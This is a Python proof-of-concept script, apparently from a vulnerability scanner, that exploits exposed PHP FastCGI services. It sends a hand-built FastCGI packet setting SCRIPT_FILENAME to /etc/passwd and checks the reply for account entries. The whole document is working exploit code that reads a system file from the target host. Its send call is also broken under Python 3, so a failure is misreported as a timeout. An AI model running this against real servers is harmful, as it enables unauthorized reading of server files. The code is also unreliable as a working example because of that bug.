#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: php fastcgi任意文件读取漏洞
referer: http://blog.sina.com.cn/s/blog_777f9dbb0102vadk.html
author: Lucifer
description: webserver为了提供fastcgi一些参数，每次转发请求的时候，会通过FASTCGI_PARAMS的包向fcgi进程进行传递。
            本来这些参数是用户不可控的，但是既然这个fcgi对外开放，那么也就说明我们可以通过设定这些参数，来让我们去做一些原本做不到的事情。
'''
import sys
import socket
from urllib.parse import urlparse

class php_fastcgi_read_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        port = 9000
        if r"http" in self.url:
            #提取host
            host = urlparse(self.url)[1]
            try:
                port = int(host.split(':')[1])
            except:
                pass
            flag = host.find(":")
            if flag != -1:
                host = host[:flag]
        else:
            host = self.url

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(6.0)
        try:
            sock.connect((host, port))
            data = b"""
                01 01 00 01 00 08 00 00  00 01 00 00 00 00 00 00
                01 04 00 01 00 8f 01 00  0e 03 52 45 51 55 45 53 
                54 5f 4d 45 54 48 4f 44  47 45 54 0f 08 53 45 52 
                56 45 52 5f 50 52 4f 54  4f 43 4f 4c 48 54 54 50 
                2f 31 2e 31 0d 01 44 4f  43 55 4d 45 4e 54 5f 52
                4f 4f 54 2f 0b 09 52 45  4d 4f 54 45 5f 41 44 44
                52 31 32 37 2e 30 2e 30  2e 31 0f 0b 53 43 52 49 
                50 54 5f 46 49 4c 45 4e  41 4d 45 2f 65 74 63 2f 
                70 61 73 73 77 64 0f 10  53 45 52 56 45 52 5f 53
                4f 46 54 57 41 52 45 67  6f 20 2f 20 66 63 67 69
                63 6c 69 65 6e 74 20 00  01 04 00 01 00 00 00 00
            """
            data_s = ''
            for _ in data.split():
                data_s += chr(int(_,16))
            sock.send(data_s)
            ret = sock.recv(1024).decode()
            if ret.find("root:") > 0 and ret.find("/bin/bash") > 0:
                sock.close()
                return "[+]存在php fastcgi任意文件读取漏洞漏洞...(高危)\tpayload: "+host+":"+str(port)
            else:
                sock.close()
                return "[-]no vuln"

        except:
            return "[-] ====>连接超时"

if __name__ == "__main__":
    testVuln = php_fastcgi_read_BaseVerify(sys.argv[1])
    testVuln.run()
